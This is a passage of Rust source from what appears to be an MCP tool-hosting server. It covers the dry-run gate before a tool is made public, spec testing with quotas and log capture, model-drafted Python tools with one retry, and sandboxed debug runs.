            code: UNTESTED_TOOL_CANNOT_BE_PUBLIC,
            message: format!("'{name}' version {} did not pass its dry run ({verdict}); it stays {}", row.current_version, row.visibility),
            data: json!({"verdict": verdict, "detail": detail, "next": "host.tool_test"}),
        };
        match self.tool_test_stamping(tenant, json!({"name": name, "_pubvis_gate": true})).await {
            Ok(v) if v.get("verdict").and_then(Value::as_str) == Some("pass") => Ok(()),
            // `unverifiable` (a chain whose mapping needs inputs the example
            // does not supply) is not a failure: R4 refuses only `will_fail`
            // or an error, so the version is stamped as tested.
            Ok(v) if v.get("verdict").and_then(Value::as_str) == Some("unverifiable") => {
                self.state.db.stamp_tested_version(tenant.id, name.to_string(), row.current_version).await?;
                Ok(())
            }
            Ok(v) => {
                let verdict = v.get("verdict").and_then(Value::as_str).unwrap_or("will_fail").to_string();
                let detail = v
                    .get("error")
                    .or_else(|| v.get("reason"))
                    .map(|d| d.to_string())
                    .unwrap_or_default();
                Err(refusal(&verdict, detail))
            }
            Err(e) => Err(refusal("error", e.to_string())),
        }
    }

    /// `host.tool_share`, with R4's dry-run gate in front of `public`.
    async fn tool_share_tested(&self, tenant: &Tenant, args: Value) -> Result<Value, AppError> {
        if args.get("visibility").and_then(Value::as_str) == Some("public")
            && let Some(name) = args.get("name").and_then(Value::as_str)
        {
            crate::sharing::parse_tags(&args)?;
            self.require_tested(tenant, name).await?;
        }
        crate::sharing::tool_share(&self.state, tenant, &args).await
    }

    /// `host.tool_publish`'s `visibility` (R3/R4): the tool is already stored
    /// (private on first publish); this moves it to `unlisted`/`public`
    /// after the dry-run gate and adds the visibility fields to `out`.
    async fn apply_publish_visibility(&self, tenant: &Tenant, args: &Value, out: &mut Value) -> Result<(), AppError> {
        let Some(name) = args.get("name").and_then(Value::as_str) else {
            return Ok(());
        };
        if let Some(requested) = args.get("visibility").and_then(Value::as_str) {
            match crate::sharing::Visibility::parse_publishable(requested)? {
                crate::sharing::Visibility::Public => {
                    self.require_tested(tenant, name).await?;
                    crate::sharing::tool_share(&self.state, tenant, &json!({"name": name, "visibility": "public"}))
                        .await?;
                }
                crate::sharing::Visibility::Unlisted => {
                    crate::sharing::tool_share(&self.state, tenant, &json!({"name": name, "visibility": "unlisted"}))
                        .await?;
                }
                _ => {
                    if self.state.db.get_tool(tenant.id, name.to_string()).await?.is_some_and(|r| r.visibility != "private") {
                        crate::sharing::tool_unshare(&self.state, tenant, &json!({"name": name})).await?;
                    }
                }
            }
        }
        if let Some(row) = self.state.db.get_tool(tenant.id, name.to_string()).await?
            && let Value::Object(map) = out
        {
            map.insert("visibility".to_string(), json!(row.visibility));
            map.insert("tags".to_string(), json!(row.tags));
            map.insert("tested_version".to_string(), json!(row.tested_version));
            map.insert("stale_test".to_string(), json!(row.tested_version != Some(row.current_version)));
        }
        Ok(())
    }

    async fn spec_test(&self, tenant: &Tenant, args: Value) -> Result<Value, AppError> {
        let kind_name = args
            .get("kind")
            .and_then(Value::as_str)
            .ok_or_else(|| AppError::InvalidArgs("missing required argument 'kind'".into()))?
            .to_string();
        let spec = args
            .get("spec")
            .cloned()
            .ok_or_else(|| AppError::InvalidArgs("missing required argument 'spec'".into()))?;
        // PRD-mcphost-tool-test-examples-from-schema R4: `invocations` is
        // optional; absent means "run the one example generated from the
        // spec's own args_schema" (filled in below once the kind is known).
        let given_invocations = match args.get("invocations") {
            None | Some(Value::Null) => None,
            Some(Value::Array(list)) => Some(list.clone()),
            Some(_) => {
                return Err(AppError::InvalidArgs("'invocations' must be an array of argument objects".into()));
            }
        };
        let invocations_len = given_invocations.as_ref().map_or(1, Vec::len);

        // AC7: refused naming the limit, zero invocations run -- checked
        // before any other work (spec validation included).
        if invocations_len > MAX_TEST_INVOCATIONS {
            return Err(AppError::Structured {
                code: TOO_MANY_INVOCATIONS,
                message: format!(
                    "at most {MAX_TEST_INVOCATIONS} invocations per host.spec_test call; got {invocations_len}"
                ),
                data: json!({"limit": MAX_TEST_INVOCATIONS}),
            });
        }

        // AC5: same error taxonomy as host.tool_publish -- spec-size, then
        // kind lookup, then sandbox readiness, then spec validation, in the
        // same order control::tool_publish checks them.
        let spec_bytes = serde_json::to_vec(&spec)
            .map_err(|e| AppError::Internal(format!("spec serialize: {e}")))?
            .len();
        if spec_bytes > MAX_SPEC_BYTES {
            return Err(AppError::SpecTooLarge(spec_bytes));
        }

        let kind: Arc<dyn Kind> =
            self.state
                .kinds
                .get(&kind_name)
                .ok_or_else(|| AppError::UnknownKind {
                    requested: kind_name.clone(),
                    registered: self.state.kinds.names(),
                    aliases: crate::kinds::aliases::alias_names(),
                })?;

        // PRD-mcphost-spec-unknown-field-rejection requirement 1 (AC1/AC2/
        // AC3): same check, same "ahead of sandbox readiness" spot, as
        // `control::tool_publish`.
        if let Some(err) =
            crate::kinds::check_unknown_spec_field(kind.as_ref(), &spec, &self.state.kinds)
        {
            return Err(err.into());
        }

        if let Some(status) = kind.sandbox_status()
            && !status.ready
        {
            // PRD-mcphost-first-publish-real-kind requirement 3 (AC2): same
            // retry-after estimate `control::tool_publish` computes.
            let retry_after_s = kind.queue_wait_estimate_s().unwrap_or(5).clamp(1, 30);
            return Err(AppError::sandbox_unavailable(&status, retry_after_s));
        }

        if let Some(err) = AppError::from_kind_violations(KindRegistry::validate_all_checked(kind.as_ref(), &spec)) {
            return Err(crate::kinds::kinddoc::enrich_invalid_spec(kind.as_ref(), err));
        }
        kind.validate_async(&spec)
            .await
            .map_err(|e| crate::kinds::kinddoc::enrich_invalid_spec(kind.as_ref(), e.into()))?;

        // PRD-mcphost-chain-host-steps requirement 4: `host.spec_test` on a
        // `chain` spec resolves every step exactly like `host.tool_publish`
        // does -- a spec that would fail to publish must fail to spec_test
        // too, for the same reason (AC2/AC5).
        if kind_name == "chain" {
            crate::kinds::chain::resolve_steps(&self.state.db, tenant.id, &spec).await?;
        }

        // AC6: refused exactly as a normal call at quota, checked once
        // before any invocation executes (not per-invocation) -- the same
        // gate a real dispatched call passes through.
        crate::preflight::check_calls_per_day(&self.state, tenant, crate::preflight::Mode::Real).await?;

        let descriptor = kind.describe(&spec);
        let requirements = kind.requirements(&spec);
        let mut generated: Option<crate::kinds::example::Example> = None;
        let invocations: Vec<Value> = match given_invocations {
            Some(list) => list,
            None if kind.validates_own_args() => vec![json!({})],
            None => {
                let ex = example_or_refusal(&descriptor.input_schema)?;
                let one = ex.args.clone();
                generated = Some(ex);
                vec![one]
            }
        };

        let secrets = build_secret_resolver(&self.state, tenant.id).await?;
        let call_timeout = self.resolve_call_timeout(&kind, &spec);
        let concurrent_calls_per_tenant = self.concurrent_calls_cap(tenant);
        let tenant_id = tenant.id;
        let namespace = tenant.namespace.clone();
        // AC12: unlike `host.tool_test`/`host.bridge_test` (deliberately
        // out-of-band debug calls, see `Self::tool_test`'s own doc comment),
        // a `host.spec_test` invocation's log output IS captured and
        // persisted -- one `BufferedLog` per invocation, built up front so
        // `ctx_factory` (called once per invocation, in order, by
        // `run_spec_test`) can hand each its own and this function can read
        // every one back once `run_spec_test` returns.
        let log_bufs: Vec<Arc<BufferedLog>> = invocations
            .iter()
            .map(|_| Arc::new(BufferedLog(std::sync::Mutex::new(Vec::new()))))
            .collect();
        let mut log_bufs_iter = log_bufs.iter().cloned();
        let state_backend: Arc<dyn StateBackend> = Arc::new(TenantStateBridge {
            state: self.state.clone(),
            tenant: tenant.clone(),
            end_user: None,
            dry_run: None,
        });
        let table_backend: Arc<dyn TableBackend> = Arc::new(TenantTableBridge {
            state: self.state.clone(),
            tenant: tenant.clone(),
            dry_run: None,
            end_user: None,
        });
        let docs_backend: Arc<dyn DocsBackend> = Arc::new(TenantDocsBridge {
            state: self.state.clone(),
            tenant: tenant.clone(),
            end_user: None,
        });
        let lineage_backend: Arc<dyn LineageBackend> = Arc::new(TenantLineageBridge {
            state: self.state.clone(),
            tenant: tenant.clone(),
        });
        let drift_backend: Arc<dyn DriftBackend> = Arc::new(TenantDriftBridge {
            state: self.state.clone(),
            tenant: tenant.clone(),
        });
        // PRD-mcphost-sandbox-channel-msg-bridge requirement 4 (AC4): same
        // "real backend, short-circuited on `test_mode` inside the bridge
        // itself" wiring `tool_test` above uses -- `spec` here may be a
        // python kind too.
        let channel_backend: Arc<dyn ChannelBackend> = Arc::new(TenantChannelBridge {
            state: self.state.clone(),
            tenant: tenant.clone(),
        });
        let msg_backend: Arc<dyn MsgBackend> = Arc::new(TenantMsgBridge {
            state: self.state.clone(),
            tenant: tenant.clone(),
        });
        let sidecar_ops_max = self.sidecar_ops_cap(tenant);
        let results = run_spec_test(&kind, &spec, &invocations, call_timeout, || CallCtx {
            tenant_id,
            namespace: namespace.clone(),
            secrets: secrets.clone(),
            deadline: Instant::now() + call_timeout,
            log: log_bufs_iter
                .next()
                .map(|buf| buf as Arc<dyn CallLog>)
                .unwrap_or_else(|| Arc::new(NullLog)),
            test_mode: true,
            resources: Arc::new(NullResourceSink),
            tool_name: None,
            state: state_backend.clone(),
            table: table_backend.clone(),
            docs: docs_backend.clone(),
            lineage: lineage_backend.clone(),
            drift: drift_backend.clone(),
            channel: channel_backend.clone(),
            msg: msg_backend.clone(),
            elicit: Arc::new(crate::elicit::NoClientElicit),
            sampling: Arc::new(crate::sampling::NoClientSampling { state: None }),
            sidecar_ops: Arc::new(std::sync::atomic::AtomicI64::new(0)),
            sidecar_ops_max,
            compose_depth: 0,
            compose_children: None,
            compose_db: None,
            compose_kinds: None,
            concurrent_calls_per_tenant,
            chain_fanout_max: usize::MAX,
            run_id: None,
            progress: crate::progress::current_sink(),
            cancel_pid: Arc::new(crate::runs::CancelSlot::default()),
            egress_allowed: tenant.plan == "pro",
            sandbox_ceilings: self.state.plans.sandbox_ceilings(&tenant.plan),
            // PRD-mcphost-end-user-identity: `host.spec_test` runs a pre-
            // publish spec, not a real caller's identity-carrying call.
            end_user: None,
            vault_token: None,
            // PRD-mcphost-chain-host-steps / PRD-mcphost-dry-run-side-effects:
            // `host.spec_test`'s dry run never dispatches a step either (same
            // `ctx.test_mode` branch `host.tool_test` short-circuits on, but
            // with no `DryRunCtx` savepoint backing this pre-publish check)
            // -- nothing to reach here.
            host_dispatch: None,
            // PRD-mcphost-chain-run-lineage: same "pre-publish dry run, no
            // run row of its own" reasoning as `end_user` above.
            parent_run_id: None,
            budget: None,
            prev_result: None,
        })
        .await;

        // AC6: each executed invocation is metered like a normal call (a
        // `calls` row, counting toward `calls_per_day`) even though no
        // `tools` row is ever written for this ad hoc spec. AC12: the same
        // synthetic per-kind name also buckets this call's persisted log
        // lines (below), so `host.tool_logs` can serve them back without a
        // `tools` row existing for it.
        let test_log_name = format!("__spec_test__.{kind_name}");
        for result in &results {
            let ok = result.get("ok").and_then(Value::as_bool).unwrap_or(false);
            let error_class = result
                .get("code")
                .and_then(Value::as_str)
                .map(str::to_string);
            let duration_ms = result
                .get("duration_ms")
                .and_then(Value::as_i64)
                .unwrap_or(0);
            // `host.spec_test` runs a pre-publish spec, so a `building`
            // result here is possible (a fresh spec against a
            // never-before-seen requirements set) but not the common case
            // requirement 6 targets; `ok`/`error` covers it -- no
            // `waited_ms=` inspection since this loop has no per-invocation
            // log buffer handle at this point.
            let call_outcome = if ok { "ok" } else { "error" };
            let _ = self
                .state
                .db
                .record_call(
                    tenant.id,
                    test_log_name.clone(),
                    duration_ms,
                    ok,
                    error_class,
                    None,
                    None,
                    call_outcome,
                    tenant.origin.clone(),
                    tenant.origin_detail.clone(),
                )
                .await;
        }

        // AC12: each invocation's captured log lines, marked `[test]` so
        // they read as distinguishable from a production call's own lines
        // in the same `host.tool_logs` bucket.
        for buf in &log_bufs {
            let lines = buf.0.lock().map(|g| g.clone()).unwrap_or_default();
            for line in lines {
                let _ = self
                    .state
                    .db
                    .append_log(tenant.id, test_log_name.clone(), format!("[test] {line}"))
                    .await;
            }
        }

        // PRD-mcphost-tool-kind-honor requirement 2 (AC3): unlike
        // `host.tool_publish`, a disagreement here never aborts the dry
        // run (a spec whose required fields actually contradict the
        // requested kind already fails `validate_all` above, same as
        // publish would) -- this only surfaces what the spec's shape
        // implies alongside what was requested, for a spec that validates
        // under the requested kind despite also carrying the other kind's
        // signal (e.g. an echo spec with a stray `source` field).
        let kind_report = match crate::kinds::infer::infer_kind_signal(&spec) {
            Some(signal) if signal.kind != kind_name => json!({
                "resolved": signal.kind,
                "requested": kind_name.clone(),
                "reason": signal.reason,
            }),
            _ => json!({"resolved": kind_name.clone(), "requested": kind_name.clone()}),
        };

        let mut report = json!({
            "kind": kind_report,
            "args_schema": descriptor.input_schema,
            "requirements": requirements,
            "invocations": results,
            "contract": kind.contract().response_block(),
        });
        if kind_name == "python" {
            report["tool_lint"] = json!(crate::kinds::python_lint::lint_spec(&spec));
        }
        if let (Some(ex), Some(map)) = (&generated, report.as_object_mut()) {
            add_example_fields(map, ex);
        }
        Ok(crate::secrets::redact_keys(&report, &["tenant_key"]))
    }

    /// `host.tool_from_description` (PRD-mcphost-first-tool-from-description
    /// R3/R4): asks the configured [`crate::drafter::Drafter`] for a python
    /// spec built from the kind's generated contract, `spec_test`s it, retries
    /// once with the failure data, then publishes and (when `share` is true)
    /// mints a public URL. Calls the same `spec_test`, `tool_publish` and
    /// `tool_share` functions a hand-written spec goes through.
    async fn tool_from_description(&self, tenant: &Tenant, args: Value) -> Result<Value, AppError> {
        let description = args
            .get("description")
            .and_then(Value::as_str)
            .map(str::trim)
            .filter(|d| !d.is_empty())
            .ok_or_else(|| AppError::InvalidArgs("missing required argument 'description'".into()))?
            .to_string();
        let kind_name = args.get("kind").and_then(Value::as_str).unwrap_or("python");
        if !crate::drafter::DRAFT_KINDS.contains(&kind_name) {
            return Err(AppError::InvalidArgs(format!(
                "host.tool_from_description drafts python tools only; got kind '{kind_name}'"
            )));
        }
        let share = args.get("share").and_then(Value::as_bool).unwrap_or(true);
        let Some(drafter) = self.state.drafter.clone() else {
            return Err(AppError::Structured {
                code: DRAFT_UNAVAILABLE,
                message: "this host has no draft model configured".to_string(),
                data: json!({"next_call": {"tool": "host.quickstart", "args": {}}}),
            });
        };
        let kind: Arc<dyn Kind> = self.state.kinds.get("python").ok_or_else(|| AppError::UnknownKind {
            requested: "python".to_string(),
            registered: self.state.kinds.names(),
            aliases: crate::kinds::aliases::alias_names(),
        })?;
        let example = kind.example();

        // R5: admit the draft against `drafts_per_day` and the host cap
        // before the model is asked; the pending row counts concurrent calls.
        let plan = self.state.plans.get(&tenant.plan).ok_or_else(|| {
            AppError::Internal(format!("tenant's plan '{}' is not in the loaded plan catalog", tenant.plan))
        })?;
        let day_start = now_unix() - now_unix().rem_euclid(86_400);
        let draft_id = match self
            .state
            .db
            .reserve_draft(tenant.id, day_start, plan.drafts_per_day, crate::drafter::daily_cap())
            .await?
        {
            crate::db::DraftReservation::Reserved(id) => id,
            crate::db::DraftReservation::TenantLimit { used } => {
                return Err(AppError::Structured {
                    code: PLAN_LIMIT,
                    message: format!(
                        "this plan allows {} drafts_per_day; this tenant already made {used} today",
                        plan.drafts_per_day
                    ),
                    data: json!({
                        "limit": plan.drafts_per_day,
                        "used": used,
                        "field": "drafts_per_day",
                        "drafts_per_day": plan.drafts_per_day,
                    }),
                });
            }
            crate::db::DraftReservation::HostCap { used } => {
                return Err(AppError::Structured {
                    code: DRAFT_UNAVAILABLE,
                    message: format!("this host's daily draft cap ({used}) is spent; try again tomorrow"),
                    data: json!({"next_call": {"tool": "host.quickstart", "args": {}}}),
                });
            }
        };
        self.draft_loop(tenant, &args, &description, share, &drafter, &example, draft_id).await
    }

    #[allow(clippy::too_many_arguments)]
    async fn draft_loop(
        &self,
        tenant: &Tenant,
        args: &Value,
        description: &str,
        share: bool,
        drafter: &Arc<dyn crate::drafter::Drafter>,
        example: &crate::kinds::KindExample,
        draft_id: i64,
    ) -> Result<Value, AppError> {
        use crate::drafter::{MAX_DRAFT_INVOCATIONS, build_prompt, spec_test_verdict};
        const MAX_ATTEMPTS: u64 = 2;
        let (mut ptok, mut ctok) = (0i64, 0i64);
        let mut retry: Option<(Value, Value)> = None;
        let mut last: Option<(AppError, Value, String)> = None;
        for attempt in 1..=MAX_ATTEMPTS {
            let prompt = build_prompt(description, example, retry.as_ref().map(|(s, e)| (s, e)));
            let draft = match drafter.draft(&prompt).await {
                Ok(d) => d,
                Err(e) => {
                    let _ = self.state.db.finish_draft(draft_id, false, attempt as i64, (ptok, ctok)).await;
                    return Err(e);
                }
            };
            ptok += draft.prompt_tokens;
            ctok += draft.completion_tokens;
            let invocations: Vec<Value> = draft.invocations.iter().take(MAX_DRAFT_INVOCATIONS).cloned().collect();
            let spec = draft.spec.clone();
            let name = args
                .get("name")
                .and_then(Value::as_str)
                .map(str::to_string)
                .or_else(|| draft.name.clone())
                .unwrap_or_else(|| "drafted_tool".to_string());
            let outcome = self
                .spec_test(tenant, json!({"kind": "python", "spec": spec, "invocations": invocations}))
                .await;
            let failure = match outcome {
                Ok(result) => match spec_test_verdict(&result) {
                    Ok(()) => {
                        control::tool_publish(&self.state, tenant, &json!({"name": name, "kind": "python", "spec": spec}))
                            .await?;
                        let mut public_url = Value::Null;
                        if share {
                            let shared = crate::sharing::tool_share(
                                &self.state,
                                tenant,
                                &json!({"name": name, "visibility": "url"}),
                            )
                            .await?;
                            public_url = shared.get("url").cloned().unwrap_or(Value::Null);
                        }
                        let ran = result["invocations"].as_array().map_or(0, Vec::len);
                        let _ = self.state.db.finish_draft(draft_id, true, attempt as i64, (ptok, ctok)).await;
                        return Ok(json!({
                            "name": name,
                            "qualified_name": format!("{}.{}", tenant.namespace, name),
                            "public_url": public_url,
                            "source": spec["source"],
                            "test": {"ok": true, "invocations": result["invocations"], "ran": ran},
                            "attempts": attempt,
                        }));
                    }
                    Err(invocation) => {
                        let message = invocation["message"].as_str().unwrap_or("invocation failed").to_string();
                        let data = json!({"invocation": invocation, "invocations": result["invocations"]});
                        (
                            AppError::Structured { code: DRAFT_TEST_FAILED, message, data: data.clone() },
                            data,
                        )
                    }
                },
                Err(e) => {
                    let data = serde_json::to_value(e.clone().into_error_data()).unwrap_or(Value::Null);
                    (e, data)
                }
            };
            retry = Some((spec.clone(), failure.1));
            last = Some((failure.0, spec, name));
        }

        let _ = self.state.db.finish_draft(draft_id, false, MAX_ATTEMPTS as i64, (ptok, ctok)).await;
        // R4: the last spec_test error, unchanged, plus the best draft and the
        // call that publishes it by hand.
        let (err, draft_spec, name) = last.expect("the loop runs at least once");
        let code = err.code();
        let ed = err.into_error_data();
        let mut data = match ed.data {
            Some(Value::Object(m)) => m,
            _ => serde_json::Map::new(),
        };
        data.insert("draft_spec".to_string(), draft_spec.clone());
        data.insert(
            "next_call".to_string(),
            json!({"tool": "host.tool_publish", "args": {"name": name, "kind": "python", "spec": draft_spec}}),
        );
        Err(AppError::Structured { code, message: ed.message.to_string(), data: Value::Object(data) })
    }

    /// `host.tool_run` (PRD-mcphost-code-tools-warm-pool requirement 3,
    /// AC6/AC7): a debug run, dispatching to `Kind::tool_run` rather than
    /// `Kind::call` -- distinct raw-stdout/stderr/exit-code response shape,
    /// no `calls` row, no metering, and its own 30-per-minute-per-tenant
    /// rate limit checked before the sandbox ever runs (so the 31st call
    /// costs nothing, not even a build-state lookup).
    async fn tool_run(&self, tenant: &Tenant, args: Value) -> Result<Value, AppError> {
        if !self.state.tool_run_limiter.allow(tenant.id) {
            return Err(AppError::Structured {
                code: crate::errors::RATE_LIMITED,
                message: "host.tool_run is limited to 30 calls per tenant per minute".to_string(),
                data: json!({"retry_after_s": 60}),
            });
        }

        let local_name = args
            .get("name")
            .and_then(Value::as_str)
            .ok_or_else(|| AppError::InvalidArgs("missing required argument 'name'".into()))?
            .to_string();
        let call_args = args
            .get("args")
            .cloned()
            .unwrap_or_else(|| Value::Object(Default::default()));

        let row: ToolRow = self
            .state
            .db
            .get_tool(tenant.id, local_name.clone())
            .await?
            .ok_or_else(|| AppError::ToolNotFound(local_name.clone()))?;
        let kind: Arc<dyn Kind> = self.state.kinds.get(&row.kind).ok_or_else(|| {
            AppError::Internal(format!(
                "published tool names unregistered kind '{}'",
                row.kind
            ))
        })?;

        // PRD-mcphost-sandbox-ready requirement 3 (AC3): same first-try
        // rejection as `host.tool_publish`, before this tool's kind is ever
        // dispatched to.
        if let Some(status) = kind.sandbox_status()
            && !status.ready
        {
            // PRD-mcphost-first-publish-real-kind requirement 3 (AC2): same
            // retry-after estimate `control::tool_publish` computes.
            let retry_after_s = kind.queue_wait_estimate_s().unwrap_or(5).clamp(1, 30);
            return Err(AppError::sandbox_unavailable(&status, retry_after_s));
        }

        let descriptor = kind.describe(&row.spec);
        // PRD-mcphost-chain-run-lineage requirement 3: see
        // `Kind::validates_own_args`'s own doc comment -- `chain` is
        // `tool_run_unsupported` regardless, but this keeps every dispatch
        // path's schema-check behavior consistent.
        if !kind.validates_own_args()
            && let Ok(validator) = jsonschema::validator_for(&descriptor.input_schema)
            && let Err(e) = validator.validate(&call_args)
        {
            // Requirement 1/AC3 (PRD-mcphost-python-kind-runtime): phase
            // `args_coercion`, naming the argument and both types -- shared
            // with every kind via `describe_args_error`, wired through
            // `AppError::Structured` (not `ArgsInvalid`) so the extra `data`
            // fields survive into the JSON-RPC response; the wire code stays
            // pinned to exactly `args_invalid` either way.
            let args_err = describe_args_error(&e);
            return Err(AppError::Structured {
                code: crate::errors::ARGS_INVALID,
                message: args_err.message(),
                data: args_err.data(),
            });
        }

        let secret_map = build_secret_map(&self.state, tenant.id).await?;
        let secrets = secret_resolver_for(&self.state, tenant.id, secret_map.clone()).await?;
        // PRD-mcphost-dry-run-side-effects requirement 1 / AC4: `test: true`
        // is this method's own opt-in (unlike `host.tool_test`, `test:
        // false`/absent is still a real, metered-by-nothing-extra debug run
        // -- Non-goals: "making host.tool_run dry by default").
        let test = args.get("test").and_then(Value::as_bool).unwrap_or(false);
        let dry_run = test.then(|| {
            crate::dryrun::DryRunCtx::new(self.state.db.path().to_path_buf(), self.state.db.cfg())
        });
        // requirement 5 / AC7: `host.tool_run`'s result carries a `state`
        // tally too (same shape as `host.tool_test`'s) -- read back from
        // `state_backend` after the call below.
        let state_backend = Arc::new(CountingStateBackend::new(
            Arc::new(TenantStateBridge {
                state: self.state.clone(),
                tenant: tenant.clone(),
                end_user: None,
                dry_run: dry_run.clone(),
            }),
            None,
        ));
        let table_backend: Arc<dyn TableBackend> = Arc::new(TenantTableBridge {
            state: self.state.clone(),
            tenant: tenant.clone(),
            dry_run: dry_run.clone(),
            end_user: None,
        });
        let docs_backend: Arc<dyn DocsBackend> = Arc::new(TenantDocsBridge {
            state: self.state.clone(),
            tenant: tenant.clone(),
            end_user: None,
        });
        let lineage_backend: Arc<dyn LineageBackend> = Arc::new(TenantLineageBridge {
            state: self.state.clone(),
            tenant: tenant.clone(),
        });
        let drift_backend: Arc<dyn DriftBackend> = Arc::new(TenantDriftBridge {
            state: self.state.clone(),
            tenant: tenant.clone(),
        });
        let channel_backend: Arc<dyn ChannelBackend> = Arc::new(TenantChannelBridge {
            state: self.state.clone(),
            tenant: tenant.clone(),
        });
        let msg_backend: Arc<dyn MsgBackend> = Arc::new(TenantMsgBridge {
            state: self.state.clone(),
            tenant: tenant.clone(),
        });
        let resources = Arc::new(CellResourceSink::new());
        let resolved_timeout = self.resolve_call_timeout(&kind, &row.spec);
        let ctx = CallCtx {
            tenant_id: tenant.id,
            namespace: tenant.namespace.clone(),
            secrets,
            deadline: Instant::now() + resolved_timeout,
            log: Arc::new(NullLog) as Arc<dyn CallLog>,
            test_mode: test,
            resources: resources.clone() as Arc<dyn ResourceSink>,
            tool_name: Some(local_name.clone()),
            state: state_backend.clone() as Arc<dyn StateBackend>,
            table: table_backend.clone(),
            docs: docs_backend.clone(),
            lineage: lineage_backend.clone(),
            drift: drift_backend.clone(),
            channel: channel_backend.clone(),
            msg: msg_backend.clone(),
            elicit: Arc::new(crate::elicit::NoClientElicit),
            sampling: Arc::new(crate::sampling::NoClientSampling { state: None }),
            sidecar_ops: Arc::new(std::sync::atomic::AtomicI64::new(0)),
            sidecar_ops_max: self.sidecar_ops_cap(tenant),
            // PRD-mcphost-composition: `host.tool_run` has no notion of a
            // composition tree of its own yet (see `CallCtx::compose_db`'s
            // doc) -- `chain`/`mcphost.call` are unavailable from here,
            // same as `host.tool_test`/`host.spec_test` above.
            compose_depth: 0,
            compose_children: None,
            compose_db: None,
            compose_kinds: None,
            concurrent_calls_per_tenant: self.concurrent_calls_cap(tenant),
            chain_fanout_max: self.chain_fanout_cap(tenant),
            // PRD-mcphost-sandbox-egress-allowlist requirement 1/2/3: resolved
            // from the tenant's plan here, once, same convention as
            // `concurrent_calls_per_tenant` just above.
            egress_allowed: tenant.plan == "pro",
            sandbox_ceilings: self.state.plans.sandbox_ceilings(&tenant.plan),
            // PRD-mcphost-runs-and-jobs: an ordinary synchronous dispatch is
            // never a job -- no run id to report progress against, no pid
            // slot `host.runs.cancel` would ever look up.
            run_id: None,
            progress: crate::progress::current_sink(),
            cancel_pid: Arc::new(crate::runs::CancelSlot::default()),
            // PRD-mcphost-end-user-identity: `host.tool_run`'s own
            // `record_call` (below) carries no end-user columns either --
            // out of this PRD's tested scope (AC1/AC2 exercise the plain
            // `tools/call` path, `call_published_tool`).
            end_user: None,
            vault_token: None,
            // PRD-mcphost-chain-host-steps: `host.tool_run`'s debug run has
            // no notion of a host step at all (`Kind::tool_run` is a
            // different entry point than `Kind::call`, which `chain` never
            // overrides) -- nothing to reach here.
            host_dispatch: None,
            // PRD-mcphost-chain-run-lineage: same "no composition tree,
            // no run row" reasoning as `compose_db`/`end_user` above.
            parent_run_id: None,
            budget: None,
            prev_result: None,
        };

        let start = Instant::now();
        // PRD-mcphost-call-trace-replay requirement 1: see `tool_test`.
        let trace_args = call_args.clone();
        let capture = crate::calltrace::enabled().then(crate::calltrace::new_capture);
        let call = tokio::time::timeout(resolved_timeout, kind.tool_run(&row.spec, call_args, &ctx));
        let outcome = match &dry_run {
            Some(dry_run) => {
                let call = crate::dryrun::with_dry_run(dry_run.clone(), call);
                match &capture {
                    Some(cap) => crate::calltrace::scope(cap.clone(), call).await,
                    None => call.await,
                }
            }
            None => match &capture {
                Some(cap) => crate::calltrace::scope(cap.clone(), call).await,
                None => call.await,
            },
        };
        // Requirement 2: rolled back regardless of outcome, same as
        // `host.tool_test` above.
        if let Some(dry_run) = &dry_run {
            crate::dryrun::finish(dry_run.clone()).await;
        }
        let duration_ms = start.elapsed().as_millis() as i64;
        let error_info = match &outcome {
            Ok(Err(kind_err)) => Some(crate::calltrace::kind_error_info(kind_err)),
            Err(_) => Some(json!({"code": "call_timeout"})),
            Ok(Ok(_)) => None,
        };

        let result = match outcome {
            Ok(Ok(mut value)) => {
                if let Some(obj) = value.as_object_mut() {
                    // PRD-mcphost-sandbox-resource-limits-from-plan R5.
                    let used = if kind.name() == "python" { resources.resources_used(duration_ms) } else { None };
                    crate::envelope::stamp_tool_run(
                        obj,
                        duration_ms,
                        used,
                        state_backend.snapshot().to_json(),
                        dry_run
                            .as_ref()
                            .map(|d| json!({"writes": d.writes(), "delivered": false, "rolled_back": true})),
                    );
                }
                if let Some(cap) = &capture {
                    // `tool_run` answers with the full raw output; the trace
                    // keeps the same bytes, tail-bounded.
                    let text = |key: &str| value.get(key).and_then(Value::as_str).unwrap_or("").to_string();
                    cap.lock().unwrap_or_else(|e| e.into_inner()).set_output(&text("stdout"), &text("stderr"));
                }
                Ok(value)
            }
            Ok(Err(kind_err)) => Err(AppError::from(kind_err)),
            Err(_elapsed) => Err(AppError::CallTimeout(resolved_timeout.as_secs())),
        };
        self.finish_test_call(tenant, &local_name, &trace_args, &secret_map, capture.as_ref(), duration_ms, error_info, result)
            .await
    }

    /// `host.tool_call` (PRD-mcphost-session-key requirements 11-15,
    /// AC11-15): resolves `name` against the caller's own namespace and
    /// delegates outright to `call_published_tool` -- the same
    /// metering, schema-validation and secret-resolution path a direct
    /// `<namespace>.<name>` call takes. Requirement 12's whole point is
    /// that a `host.tool_call` invocation must be indistinguishable from a
    /// direct call in `host.usage` and `host.tool_logs`, unlike
    /// `host.tool_test`, which deliberately records neither -- so this
    /// must never reimplement any of that logic, only reach it.
    ///
    /// PRD-mcphost-runs-and-jobs P0 requirement 3: `async: bool` (default
    /// `false`) branches BEFORE any of that synchronous machinery --
    /// `async: true` never touches `call_published_tool`, `calls`, or the
    /// 30s deadline at all; it inserts a `queued` run
    /// (`runs::enqueue`) and returns immediately.
    /// PRD-mcphost-uptime-probe-recipe-green requirement 1:
    /// `host.uptime.create`. Validation is pure ([`crate::uptime::parse_create`]);
    /// the first probe runs through [`Self::host_tool_call`] so it is metered
    /// and logged exactly like a scheduled fire.
    async fn uptime_create(
        &self,
        tenant: &Tenant,
        args: Value,
        auth_method: &str,
        end_user: Option<&crate::enduser::EndUser>,
    ) -> Result<Value, AppError> {
        let plan = self.state.plans.get(&tenant.plan).ok_or_else(|| {
            AppError::Internal(format!(
                "tenant's plan '{}' is not in the loaded plan catalog",
                tenant.plan
            ))
        })?;
        let create = crate::uptime::parse_create(&self.state.kinds, plan, &args)?;
        let trigger = crate::uptime::create_assets(&self.state, tenant, &create).await?;
        let probe = crate::uptime::probe_tool_name(&create.name);
        let first = self
            .host_tool_call(tenant, json!({"name": probe}), auth_method, end_user)
            .await;
        let first_result = match first {
            Ok(v) => crate::uptime::first_result_of(&v),
            Err(e) => json!({"error": e.to_string(), "rows": []}),
        };
        let mut out = json!({
            "status_tool": create.name,
            "probe_tool": probe,
            "schedule_id": trigger.get("id").cloned().unwrap_or(Value::Null),
            "every_s": create.every_s,
            "next_fire_unix": trigger.get("next_unix").cloned().unwrap_or(Value::Null),
            "first_result": first_result,
        });
